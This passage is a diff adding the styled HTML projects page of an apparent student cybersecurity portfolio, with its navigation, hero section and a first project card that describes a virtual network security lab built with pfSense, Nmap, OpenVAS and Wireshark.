+            position: absolute;
+            inset: 0;
+            border-radius: 24px;
+            border: 1px solid transparent;
+            background: linear-gradient(135deg, color-mix(in srgb, var(--project-accent) 30%, transparent), transparent 35%, transparent 68%, color-mix(in srgb, var(--project-accent) 16%, transparent)) border-box;
+            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: destination-out;
+            mask-composite: exclude;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .card-number {
+            top: 0.95rem;
+            right: 0.95rem;
+            padding: 0.38rem 0.72rem;
+            background: rgba(3,5,8,0.86);
+        }
+        .card-inner {
+            grid-template-columns: 1fr;
+        }
+        .card-left {
+            display: grid;
+            grid-template-columns: minmax(0, 1.1fr) minmax(320px, 0.9fr);
+            grid-template-areas:
+                "header image"
+                "overview image"
+                "achievements image"
+                "stack image";
+            gap: 0.95rem 1rem;
+            padding: 1rem;
+            align-items: stretch;
+        }
+        .card-header {
+            grid-area: header;
+            display: grid;
+            grid-template-columns: 64px minmax(0, 1fr);
+            gap: 0.9rem;
+            align-items: center;
+            padding: 1rem;
+            border: 1px solid rgba(255,255,255,0.07);
+            background:
+                linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.012)),
+                radial-gradient(circle at top left, color-mix(in srgb, var(--project-accent) 10%, transparent), transparent 40%);
+            border-radius: 18px;
+        }
+        .card-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            animation: cardIconPulse 3.5s ease-in-out infinite;
+        }
+        .card-icon svg {
+            width: 26px;
+            height: 26px;
+        }
+        .card-meta {
+            padding: 0;
+            border: none;
+            background: transparent;
+            box-shadow: none;
+            border-radius: 0;
+        }
+        .card-title {
+            font-size: clamp(1.7rem, 2.25vw, 2.35rem);
+            line-height: 1.02;
+            max-width: none;
+            text-shadow: none;
+        }
+        .card-subtitle {
+            margin-top: 0.4rem;
+        }
+        .card-image {
+            grid-area: image;
+            position: relative;
+            top: auto;
+            min-height: 100%;
+            border-radius: 18px;
+            overflow: hidden;
+            isolation: isolate;
+        }
+        .card-image img {
+            min-height: 420px;
+            transition: transform 0.9s cubic-bezier(0.22, 1, 0.36, 1), filter 0.4s ease;
+        }
+        .project-card:hover .card-image img {
+            transform: scale(1.045);
+            filter: contrast(1.08) saturate(1.08);
+        }
+        .card-image::before {
+            background:
+                linear-gradient(180deg, rgba(3,5,8,0.06), rgba(3,5,8,0.26) 46%, rgba(3,5,8,0.62)),
+                linear-gradient(135deg, color-mix(in srgb, var(--project-accent) 14%, transparent), transparent 30%);
+        }
+        .card-image::after {
+            inset: auto 0 0 0;
+            width: auto;
+            height: 72px;
+            transform: none;
+            border: none;
+            border-radius: 0;
+            background: linear-gradient(180deg, transparent, rgba(3,5,8,0.88));
+            backdrop-filter: none;
+        }
+        .img-overlay-label {
+            left: 0.9rem;
+            top: auto;
+            bottom: 0.9rem;
+            font-size: 0.56rem;
+            padding: 0.42rem 0.66rem;
+            animation: cardBadgeFloat 4.5s ease-in-out infinite;
+        }
+        .card-overview-label {
+            display: block;
+            margin-bottom: -0.42rem;
+        }
+        .card-left > .card-overview-label:nth-of-type(1) { grid-area: overview; align-self: start; }
+        .card-left > .card-overview-label:nth-of-type(2) { grid-area: achievements; align-self: start; }
+        .card-left > .card-overview-label:nth-of-type(3) { grid-area: stack; align-self: start; }
+        .card-desc,
+        .achievements,
+        .tech-tags,
+        .stats-block,
+        .links-block,
+        .timeline-block,
+        .features-block,
+        .command-block {
+            background: linear-gradient(180deg, rgba(255,255,255,0.022), rgba(255,255,255,0.012));
+            border: 1px solid rgba(255,255,255,0.07);
+            border-radius: 16px;
+        }
+        .card-desc {
+            grid-area: overview;
+            padding: 1.8rem 1rem 1rem;
+            font-size: 0.76rem;
+            line-height: 1.82;
+        }
+        .achievements {
+            grid-area: achievements;
+            padding: 1.8rem 1rem 0.9rem;
+            gap: 0.4rem;
+        }
+        .achievement-item {
+            font-size: 0.69rem;
+            padding: 0.68rem 0;
+        }
+        .tech-tags {
+            grid-area: stack;
+            padding: 1.8rem 0.95rem 0.95rem;
+        }
+        .tech-tag {
+            font-size: 0.6rem;
+            padding: 0.42rem 0.68rem;
+        }
+        .card-right {
+            padding: 0 1rem 1rem;
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 0.8rem;
+        }
+        .stats-block,
+        .links-block,
+        .timeline-block,
+        .features-block,
+        .command-block {
+            padding: 0.95rem;
+            min-height: 100%;
+            transition: transform 0.25s ease, border-color 0.25s ease, background 0.25s ease;
+        }
+        .project-card:hover .stats-block,
+        .project-card:hover .links-block,
+        .project-card:hover .timeline-block,
+        .project-card:hover .features-block,
+        .project-card:hover .command-block {
+            border-color: color-mix(in srgb, var(--project-accent) 26%, rgba(255,255,255,0.07));
+        }
+        .stats-block:hover,
+        .links-block:hover,
+        .timeline-block:hover,
+        .features-block:hover,
+        .command-block:hover {
+            transform: translateY(-2px);
+        }
+        @keyframes cardBadgeFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
+        }
+        @keyframes cardIconPulse {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-2px); }
+        }
+        @media (max-width: 900px) {
+            .card-left {
+                grid-template-columns: 1fr;
+                grid-template-areas:
+                    "header"
+                    "image"
+                    "overview"
+                    "achievements"
+                    "stack";
+                padding: 1rem;
+            }
+            .card-image,
+            .card-image img {
+                min-height: 240px;
+            }
+            .card-right {
+                grid-template-columns: 1fr;
+                padding: 0 1rem 1rem;
+            }
+        }
+        @media (max-width: 500px) {
+            .card-header {
+                grid-template-columns: 1fr;
+            }
+            .card-icon {
+                width: 56px;
+                height: 56px;
+            }
+            .card-image,
+            .card-image img {
+                min-height: 210px;
+            }
+            .card-number {
+                position: static;
+                margin: 0 1rem 0 auto;
+            }
+        }
+
+        body {
+            background:
+                radial-gradient(circle at 24% 16%, rgba(0, 255, 157, 0.11), transparent 18%),
+                radial-gradient(circle at 82% 32%, rgba(0, 170, 255, 0.08), transparent 22%),
+                linear-gradient(180deg, #010201 0%, #020704 42%, #010201 100%);
+        }
+        body::before,
+        .grid-bg,
+        .corner-accent { display: none; }
+        .polyglot-bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+            background:
+                radial-gradient(circle at 18% 16%, rgba(0,255,157,0.12), transparent 18%),
+                radial-gradient(circle at 82% 22%, rgba(0,170,255,0.09), transparent 20%),
+                radial-gradient(circle at 52% 82%, rgba(0,255,157,0.06), transparent 28%),
+                linear-gradient(180deg, #010201 0%, #020704 48%, #010201 100%);
+        }
+        .polyglot-bg::before,
+        .polyglot-bg::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+        }
+        .polyglot-bg::before {
+            background:
+                repeating-linear-gradient(90deg, rgba(0,255,157,0.025) 0 1px, transparent 1px 86px),
+                repeating-linear-gradient(180deg, rgba(0,255,157,0.016) 0 1px, transparent 1px 86px),
+                linear-gradient(135deg, transparent 0 19%, rgba(0,255,157,0.055) 19.2% 19.4%, transparent 19.6% 80%, rgba(0,170,255,0.045) 80.2% 80.4%, transparent 80.6%);
+            opacity: 0.72;
+        }
+        .polyglot-bg::after {
+            background:
+                radial-gradient(circle at 26% 22%, rgba(0,255,157,0.14), transparent 9%),
+                radial-gradient(circle at 74% 30%, rgba(0,170,255,0.12), transparent 12%),
+                radial-gradient(circle at 67% 76%, rgba(0,255,157,0.08), transparent 14%);
+            filter: blur(10px);
+            opacity: 0.55;
+        }
+        .cyber-lexicon {
+            position: fixed;
+            inset: 0;
+            z-index: 1;
+            pointer-events: none;
+            overflow: hidden;
+            font-family: var(--mono);
+        }
+        .cyber-term {
+            position: absolute;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.28rem 0.62rem;
+            border: 1px solid rgba(0,255,157,0.10);
+            background: rgba(0,255,157,0.025);
+            color: rgba(0,255,157,0.34);
+            font-size: clamp(0.62rem, 1.1vw, 0.9rem);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            white-space: nowrap;
+            text-shadow: 0 0 18px rgba(0,255,157,0.13);
+            box-shadow: 0 0 24px rgba(0,255,157,0.035), inset 0 0 16px rgba(0,255,157,0.025);
+            transform: translate3d(0, 0, 0) rotate(var(--rot, 0deg));
+            opacity: var(--op, 0.64);
+            mix-blend-mode: screen;
+            animation: lexiconFloat var(--dur, 12s) ease-in-out infinite;
+            animation-delay: var(--delay, 0s);
+            will-change: transform, left, top;
+        }
+        .cyber-term.blue {
+            color: rgba(0,170,255,0.32);
+            border-color: rgba(0,170,255,0.10);
+            background: rgba(0,170,255,0.025);
+            text-shadow: 0 0 18px rgba(0,170,255,0.12);
+        }
+        .cyber-term.warm {
+            color: rgba(255,215,0,0.22);
+            border-color: rgba(255,215,0,0.08);
+            background: rgba(255,215,0,0.018);
+        }
+        .cyber-term.rtl {
+            direction: rtl;
+            font-family: var(--display);
+            letter-spacing: 0.02em;
+            text-transform: none;
+            font-weight: 700;
+        }
+        .cyber-term.large {
+            font-family: var(--display);
+            font-weight: 800;
+            font-size: clamp(1rem, 2.1vw, 1.8rem);
+            letter-spacing: 0.12em;
+            border-color: transparent;
+            background: transparent;
+            padding: 0;
+        }
+        body {
+            background:
+                radial-gradient(circle at 18% 10%, rgba(0,255,157,0.105), transparent 26%),
+                radial-gradient(circle at 84% 18%, rgba(0,170,255,0.085), transparent 28%),
+                linear-gradient(180deg, #000304 0%, #02090b 44%, #010304 100%) !important;
+        }
+        .polyglot-bg {
+            background:
+                radial-gradient(ellipse at 20% 14%, rgba(0,255,157,0.18), transparent 34%),
+                radial-gradient(ellipse at 82% 24%, rgba(0,170,255,0.16), transparent 32%),
+                radial-gradient(ellipse at 58% 86%, rgba(0,255,157,0.10), transparent 42%),
+                linear-gradient(180deg, rgba(0,3,5,0.24), rgba(0,9,10,0.72)) !important;
+            opacity: 1 !important;
+        }
+        .polyglot-bg::before {
+            background:
+                linear-gradient(115deg, transparent 0 18%, rgba(0,255,157,0.075) 28%, transparent 42% 100%),
+                linear-gradient(245deg, transparent 0 24%, rgba(0,170,255,0.060) 38%, transparent 56% 100%) !important;
+            filter: blur(18px);
+            opacity: 0.72 !important;
+            animation: auroraFlow 14s ease-in-out infinite;
+        }
+        .polyglot-bg::after {
+            inset: auto -20% -8% -20% !important;
+            height: 58vh;
+            transform-origin: 50% 100%;
+            transform: perspective(680px) rotateX(62deg);
+            background:
+                linear-gradient(90deg, rgba(0,255,157,0.09) 1px, transparent 1px),
+                linear-gradient(180deg, rgba(0,255,157,0.075) 1px, transparent 1px),
+                radial-gradient(ellipse at 50% 100%, rgba(0,255,157,0.14), transparent 58%) !important;
+            background-size: 72px 72px, 72px 72px, auto !important;
+            filter: none !important;
+            opacity: 0.38 !important;
+            animation: gridBreathe 7s ease-in-out infinite;
+        }
+        .cyber-lexicon {
+            opacity: 0.42 !important;
+            mix-blend-mode: screen;
+        }
+        .cyber-term {
+            color: rgba(0,255,157,0.18) !important;
+            border-color: rgba(0,255,157,0.055) !important;
+            background: transparent !important;
+            text-shadow: 0 0 20px rgba(0,255,157,0.08) !important;
+        }
+        .cyber-term.blue {
+            color: rgba(0,170,255,0.16) !important;
+            border-color: rgba(0,170,255,0.05) !important;
+        }
+        .cyber-term.warm {
+            color: rgba(255,215,0,0.12) !important;
+            border-color: rgba(255,215,0,0.04) !important;
+        }
+        .cyber-term.large {
+            opacity: 0.42;
+        }
+        @keyframes lexiconFloat {
+            0%, 100% { transform: translate3d(0, 0, 0) rotate(var(--rot, 0deg)); }
+            50% { transform: translate3d(var(--float-x, 10px), var(--float-y, -14px), 0) rotate(calc(var(--rot, 0deg) + var(--float-rot, 1deg))); }
+        }
+        @keyframes auroraFlow {
+            0%, 100% { transform: translate3d(-2%, -1%, 0) scale(1); opacity: 0.56; }
+            50% { transform: translate3d(3%, 2%, 0) scale(1.08); opacity: 0.86; }
+        }
+        @keyframes gridBreathe {
+            0%, 100% { opacity: 0.26; filter: drop-shadow(0 0 0 rgba(0,255,157,0)); }
+            50% { opacity: 0.44; filter: drop-shadow(0 0 12px rgba(0,255,157,0.14)); }
+        }
+        @media (max-width: 900px) {
+            .polyglot-bg::after {
+                height: 48vh;
+                background-size: 52px 52px, 52px 52px, auto !important;
+                opacity: 0.28 !important;
+            }
+            .cyber-lexicon { opacity: 0.28 !important; }
+        }
+        .polyglot-bg::after {
+            opacity: 0.22 !important;
+            mask-image: linear-gradient(to bottom, transparent 0%, rgba(0,0,0,0.38) 18%, #000 42%, rgba(0,0,0,0.28) 74%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to bottom, transparent 0%, rgba(0,0,0,0.38) 18%, #000 42%, rgba(0,0,0,0.28) 74%, transparent 100%);
+        }
+        nav {
+            padding: 0.85rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(180deg, rgba(1,2,5,0.88), rgba(1,2,5,0.48) 74%, transparent);
+            backdrop-filter: blur(18px);
+            border-bottom: none;
+            height: auto;
+        }
+        .nav-shell {
+            width: min(1180px, 100%);
+            height: 64px;
+            display: grid;
+            grid-template-columns: auto 1fr auto;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.45rem 0.7rem 0.45rem 0.55rem;
+            border: 1px solid rgba(0,255,157,0.14);
+            background:
+                linear-gradient(135deg, rgba(0,255,157,0.08), rgba(0,170,255,0.025)),
+                rgba(3,5,8,0.76);
+            box-shadow: 0 18px 60px rgba(0,0,0,0.34), inset 0 0 26px rgba(0,255,157,0.035);
+            clip-path: polygon(1.2rem 0, 100% 0, 100% calc(100% - 1.2rem), calc(100% - 1.2rem) 100%, 0 100%, 0 1.2rem);
+        }
+        .nav-logo {
+            min-width: 0;
+            background: transparent;
+        }
+        .nav-logo img {
+            height: 52px;
+            width: 52px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 14px rgba(0,255,157,0.28));
+        }
+        .nav-links {
+            justify-self: center;
+            gap: 0.2rem;
+            padding: 0.25rem;
+            border: none;
+            background: transparent;
+        }
+        .nav-links a {
+            font-size: 0.68rem;
+            letter-spacing: 0.09em;
+            display: inline-flex;
+            align-items: center;
+            padding: 0.58rem 0.72rem;
+            border: 1px solid transparent;
+            transition: color 0.2s, background 0.2s, border-color 0.2s;
+        }
+        .nav-links a::before {
+            content: '';
+            position: absolute;
+            left: 0.38rem;
+            right: 0.38rem;
+            bottom: 0.28rem;
+            height: 1px;
+            background: var(--green);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.2s;
+            opacity: 0.65;
+            margin-right: 0;
+        }
+        .nav-links a:hover,
+        .nav-links a.active {
+            background: rgba(0,255,157,0.055);
+            border-color: rgba(0,255,157,0.14);
+        }
+        .nav-links a:hover::before,
+        .nav-links a.active::before { transform: scaleX(1); }
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 0.55rem;
+            justify-self: end;
+        }
+        .nav-social {
+            width: 36px;
+            height: 36px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(200,216,232,0.78);
+            border: 1px solid rgba(0,255,157,0.14);
+            background: rgba(0,255,157,0.035);
+            text-decoration: none;
+            transition: transform 0.2s, color 0.2s, border-color 0.2s, background 0.2s, box-shadow 0.2s;
+        }
+        .nav-social:hover {
+            color: var(--green);
+            border-color: rgba(0,255,157,0.36);
+            background: rgba(0,255,157,0.09);
+            box-shadow: 0 0 20px rgba(0,255,157,0.12);
+            transform: translateY(-2px);
+        }
+        .nav-social svg { width: 18px; height: 18px; }
+        .nav-status span { color: var(--text-dim); }
+        .hamburger {
+            background: rgba(0,255,157,0.04);
+            border: 1px solid rgba(0,255,157,0.15);
+            padding: 9px;
+        }
+        .mobile-menu {
+            top: 88px;
+            left: 1rem;
+            right: 1rem;
+            border: 1px solid var(--border);
+            padding: 1.25rem;
+            gap: 1rem;
+            box-shadow: 0 24px 70px rgba(0,0,0,0.42);
+        }
+        .mobile-menu a {
+            font-size: 0.78rem;
+            padding: 0.65rem 0.8rem;
+            border: 1px solid rgba(255,255,255,0.04);
+            transition: color 0.2s, background 0.2s;
+        }
+        .mobile-menu a:hover,
+        .mobile-menu a.active { background: rgba(0,255,157,0.055); }
+        .mobile-socials { display: flex; gap: 0.7rem; padding-top: 0.4rem; }
+        @media (max-width: 900px) {
+            nav { padding: 0.7rem 1rem; }
+            .nav-shell { height: 62px; grid-template-columns: auto auto; }
+            .nav-links, .nav-status, .nav-actions .nav-social { display: none; }
+        }
+        @media (max-width: 500px) {
+            nav { padding: 0.65rem 0.8rem; }
+            .nav-shell { padding: 0.4rem 0.55rem; }
+            .nav-logo img { height: 48px; width: 48px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="polyglot-bg"></div>
+    <div class="cyber-lexicon" aria-hidden="true">
+        <span class="cyber-term large" style="left:3%;top:13%;--rot:-8deg;--op:.26;--dur:7s;--delay:-1s;--float-x:20px;--float-y:-18px;">FIREWALL</span>
+        <span class="cyber-term blue" style="left:64%;top:12%;--rot:4deg;--op:.56;--dur:6s;--delay:-3s;--float-x:-18px;--float-y:22px;">CORTAFUEGOS</span>
+        <span class="cyber-term" style="left:79%;top:26%;--rot:-5deg;--op:.48;--dur:8s;--delay:-5s;--float-x:19px;--float-y:-24px;">PARE-FEU</span>
+        <span class="cyber-term" style="left:4%;top:43%;--rot:6deg;--op:.24;--dur:7.5s;--delay:-2s;--float-x:24px;--float-y:18px;">VERSCHL&#220;SSELUNG</span>
+        <span class="cyber-term blue" style="left:46%;top:22%;--rot:-2deg;--op:.42;--dur:6.5s;--delay:-7s;--float-x:-22px;--float-y:-16px;">&#38450;&#28779;&#22681;</span>
+        <span class="cyber-term" style="left:3%;top:66%;--rot:-4deg;--op:.48;--dur:8.5s;--delay:-4s;--float-x:20px;--float-y:-21px;">&#26263;&#21495;&#21270;</span>
+        <span class="cyber-term blue" style="left:69%;top:54%;--rot:7deg;--op:.46;--dur:6.5s;--delay:-6s;--float-x:-18px;--float-y:22px;">&#48169;&#54868;&#48317;</span>
+        <span class="cyber-term" style="left:32%;top:75%;--rot:-3deg;--op:.44;--dur:7.5s;--delay:-8s;--float-x:23px;--float-y:-18px;">&#35469;&#35388;</span>
+        <span class="cyber-term rtl warm" style="left:73%;top:72%;--rot:-6deg;--op:.48;--dur:7s;--delay:-1.5s;--float-x:-17px;--float-y:-24px;">&#1578;&#1588;&#1601;&#1610;&#1585;</span>
+        <span class="cyber-term rtl" style="left:12%;top:80%;--rot:5deg;--op:.36;--dur:9s;--delay:-9s;--float-x:21px;--float-y:18px;">&#1605;&#1589;&#1575;&#1583;&#1602;&#1577;</span>
+        <span class="cyber-term blue" style="left:54%;top:38%;--rot:3deg;--op:.34;--dur:8s;--delay:-4.5s;--float-x:-22px;--float-y:18px;">KIMLIK DO&#286;RULAMA</span>
+        <span class="cyber-term" style="left:28%;top:20%;--rot:-3deg;--op:.24;--dur:9s;--delay:-6.5s;--float-x:18px;--float-y:-21px;">&#1064;&#1048;&#1060;&#1056;&#1054;&#1042;&#1040;&#1053;&#1048;&#1045;</span>
+        <span class="cyber-term warm" style="left:58%;top:82%;--rot:4deg;--op:.38;--dur:6.5s;--delay:-10s;--float-x:-15px;--float-y:-21px;">ZERO TRUST</span>
+        <span class="cyber-term blue" style="left:2%;top:54%;--rot:8deg;--op:.28;--dur:8.5s;--delay:-2.5s;--float-x:24px;--float-y:16px;">&#20837;&#20405;&#26908;&#30693;</span>
+        <span class="cyber-term" style="left:42%;top:58%;--rot:-6deg;--op:.34;--dur:7.5s;--delay:-7.5s;--float-x:-22px;--float-y:-19px;">ENDPOINT SECURITY</span>
+        <span class="cyber-term blue large" style="left:74%;top:40%;--rot:-10deg;--op:.3;--dur:7s;--delay:-3.5s;--float-x:18px;--float-y:21px;">IDS / IPS</span>
+        <span class="cyber-term" style="left:34%;top:10%;--rot:5deg;--op:.28;--dur:9s;--delay:-5.5s;--float-x:-20px;--float-y:22px;">RESPOSTA A INCIDENTES</span>
+        <span class="cyber-term blue" style="left:84%;top:62%;--rot:4deg;--op:.34;--dur:8s;--delay:-8.5s;--float-x:-22px;--float-y:-18px;">CONTROLLO ACCESSI</span>
+        <span class="cyber-term" style="left:10%;top:88%;--rot:-5deg;--op:.3;--dur:7.5s;--delay:-11s;--float-x:22px;--float-y:-21px;">ANALISIS PAKET</span>
+        <span class="cyber-term warm" style="left:50%;top:8%;--rot:-7deg;--op:.24;--dur:8.5s;--delay:-6s;--float-x:-18px;--float-y:16px;">MALWARE ANALYSIS</span>
+        <span class="cyber-term blue" style="left:25%;top:48%;--rot:7deg;--op:.2;--dur:9s;--delay:-9.5s;--float-x:22px;--float-y:-18px;">VULNERABILITY SCAN</span>
+        <span class="cyber-term" style="left:62%;top:66%;--rot:-3deg;--op:.28;--dur:7s;--delay:-12s;--float-x:-17px;--float-y:22px;">&#922;&#929;&#933;&#928;&#932;&#927;&#915;&#929;&#913;&#934;&#919;&#931;&#919;</span>
+    </div>
+
+    <nav>
+        <div class="nav-shell">
+            <a href="index.html#home" class="nav-logo">
+                <img src="favicon_io/android-chrome-512x512.png" alt="SK Logo">
+            </a>
+            <ul class="nav-links">
+                <li><a href="index.html#home">Home</a></li>
+                <li><a href="index.html#about">About</a></li>
+                <li><a href="index.html#skills">Skills</a></li>
+                <li><a href="index.html#coursework">Coursework</a></li>
+                <li><a href="certifications.html">Certs</a></li>
+                <li><a href="projects.html" class="active">Projects</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+            <div class="nav-actions">
+                <a class="nav-social" href="https://github.com/Solehjon-K05" target="_blank" rel="noopener noreferrer" aria-label="GitHub profile">
+                    <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5a12 12 0 0 0-3.79 23.39c.6.11.82-.26.82-.58v-2.04c-3.34.73-4.04-1.42-4.04-1.42-.55-1.39-1.34-1.76-1.34-1.76-1.09-.75.08-.73.08-.73 1.2.08 1.84 1.24 1.84 1.24 1.07 1.83 2.81 1.3 3.49.99.11-.78.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.24-3.22-.13-.3-.54-1.52.12-3.18 0 0 1.01-.32 3.3 1.23a11.4 11.4 0 0 1 6 0c2.29-1.55 3.3-1.23 3.3-1.23.66 1.66.25 2.88.12 3.18.77.84 1.24 1.91 1.24 3.22 0 4.61-2.81 5.63-5.49 5.93.43.37.81 1.1.81 2.22v3.29c0 .32.22.69.83.57A12 12 0 0 0 12 .5Z"/></svg>
+                </a>
+                <a class="nav-social" href="https://linkedin.com/in/solekhdzhon-khuseynov-33ba47241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn profile">
+                    <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.02-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.94v5.67H9.34V8.98h3.41v1.57h.05a3.74 3.74 0 0 1 3.37-1.85c3.6 0 4.27 2.37 4.27 5.46v6.29ZM5.32 7.41a2.06 2.06 0 1 1 0-4.13 2.06 2.06 0 0 1 0 4.13Zm1.78 13.04H3.54V8.98H7.1v11.47ZM22.23 0H1.77C.79 0 0 .77 0 1.72v20.56C0 23.23.79 24 1.77 24h20.46c.98 0 1.77-.77 1.77-1.72V1.72C24 .77 23.21 0 22.23 0Z"/></svg>
+                </a>
+                <div class="nav-status"><div class="status-dot"></div><span>ONLINE</span></div>
+                <button class="hamburger" id="hamburger" aria-label="Menu"><span></span><span></span><span></span></button>
+            </div>
+        </div>
+    </nav>
+    <div class="mobile-menu" id="mobileMenu">
+        <a href="index.html#home">Home</a>
+        <a href="index.html#about">About</a>
+        <a href="index.html#skills">Skills</a>
+        <a href="index.html#coursework">Coursework</a>
+        <a href="certifications.html">Certifications</a>
+        <a href="projects.html" class="active">Projects</a>
+        <a href="contact.html">Contact</a>
+        <div class="mobile-socials">
+            <a href="https://github.com/Solehjon-K05" target="_blank" rel="noopener noreferrer">GitHub</a>
+            <a href="https://linkedin.com/in/solekhdzhon-khuseynov-33ba47241/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+        </div>
+    </div>
+
+    <!-- HERO -->
+    <section class="hero">
+        <div class="hero-inner">
+            <p class="hero-label">Portfolio / Technical Projects</p>
+            <h1>
+                <span class="line-1">Projects &</span>
+                <span class="line-2">Portfolio</span>
+            </h1>
+            <p class="hero-desc">
+                // Hands-on implementations of cybersecurity, networking,<br>
+                // and system administration across lab environments<br>
+                // and real-world architectures.
+            </p>
+            <div class="hero-stats">
+                <div><div class="hero-stat-val">17</div><div class="hero-stat-label">Projects</div></div>
+                <div><div class="hero-stat-val">40+</div><div class="hero-stat-label">Tech Stacks</div></div>
+                <div><div class="hero-stat-val">0</div><div class="hero-stat-label">Critical CVEs</div></div>
+            </div>
+        </div>
+        <div class="hero-scroll-indicator">
+            <div class="scroll-line"></div>
+            <span>Scroll</span>
+        </div>
+    </section>
+
+    <!-- PROJECTS -->
+    <section class="projects-section">
+        <div class="projects-toolbar">
+            <div class="projects-toolbar-copy">
+                <div class="projects-toolbar-label">Project Filters</div>
+                <div class="projects-toolbar-title">Browse By Project Type</div>
+                <div class="projects-filter-count" id="projectsFilterCount">Showing all projects</div>
+            </div>
+            <div class="filter-bar" id="projectFilterBar" role="toolbar" aria-label="Project type filters"></div>
+        </div>
+        <div class="projects-wrapper">
+
+            <!-- PROJECT 01 -->
+            <article class="project-card" data-delay="0">
+                <span class="card-number">01 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Security &amp; Networking</div>
+                                <h2 class="card-title">Network Security Lab</h2>
+                                <div class="card-subtitle">Virtual Environment &nbsp;·&nbsp; Fall 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTB8fG5ldHdvcmslMjBzZWN1cml0eXxlbnwwfHwwfHx8MA%3D%3D&ixlib=rb-4.1.0&q=60&w=3000" alt="Network Security Lab" loading="lazy">
+                            <div class="img-overlay-label">[VIEW TOPOLOGY]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">A comprehensive hands-on lab environment for practicing network security concepts — including firewall configuration, intrusion detection, and vulnerability assessment. Simulates multi-zone enterprise networks using industry-standard tools on a fully virtualized stack.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Configured pfSense firewall with advanced rule sets, VPN tunneling, and intrusion prevention systems</div>
+                            <div class="achievement-item">Implemented network segmentation with DMZ, internal LAN, and isolated guest network zones</div>
+                            <div class="achievement-item">Conducted full vulnerability assessment using Nmap and OpenVAS across all network segments</div>
+                            <div class="achievement-item">Analyzed traffic anomalies with Wireshark using custom capture filters and display rules</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">VirtualBox</span><span class="tech-tag">pfSense</span>
+                            <span class="tech-tag">Kali Linux</span><span class="tech-tag">Wireshark</span>
+                            <span class="tech-tag">Nmap</span><span class="tech-tag">OpenVAS</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Project Stats</div>
+                            <div class="stat-row"><span class="stat-label">Security Zones</span><span class="stat-value">3</span></div>
+                            <div class="stat-row"><span class="stat-label">Virtual Machines</span><span class="stat-value blue">5</span></div>
+                            <div class="stat-row"><span class="stat-label">Firewall Rules</span><span class="stat-value red">25+</span></div>
+                            <div class="stat-row"><span class="stat-label">Security Tests</span><span class="stat-value ok">PASS</span></div>
+                            <div class="stat-row"><span class="stat-label">Vuln Scan</span><span class="stat-value ok">CLEAN</span></div>
+                        </div>
+                        <div class="timeline-block">
+                            <div class="timeline-block-title">// Timeline</div>
+                            <div class="timeline-bar-row">
+                                <div class="timeline-bar-label"><span>Planning</span><span>2 wks</span></div>
+                                <div class="timeline-bar-track"><div class="timeline-bar-fill" style="width:100%;transition-delay:0.3s;background:rgba(0,255,157,0.4)"></div></div>
+                            </div>
+                            <div class="timeline-bar-row">
+                                <div class="timeline-bar-label"><span>Implementation</span><span>4 wks</span></div>
+                                <div class="timeline-bar-track"><div class="timeline-bar-fill" style="width:100%;transition-delay:0.5s;"></div></div>
+                            </div>
+                            <div class="timeline-bar-row">
+                                <div class="timeline-bar-label"><span>Testing</span><span>2 wks</span></div>
+                                <div class="timeline-bar-track"><div class="timeline-bar-fill" style="width:100%;transition-delay:0.7s;background:rgba(0,255,157,0.6)"></div></div>
+                            </div>
+                            <div class="timeline-total"><span class="label">Total Duration</span><span class="val">8 weeks</span></div>
+                        </div>
+                        <div class="links-block">
+                            <div class="links-block-title">// Resources</div>
+                            <a href="contact.html" class="project-link primary">
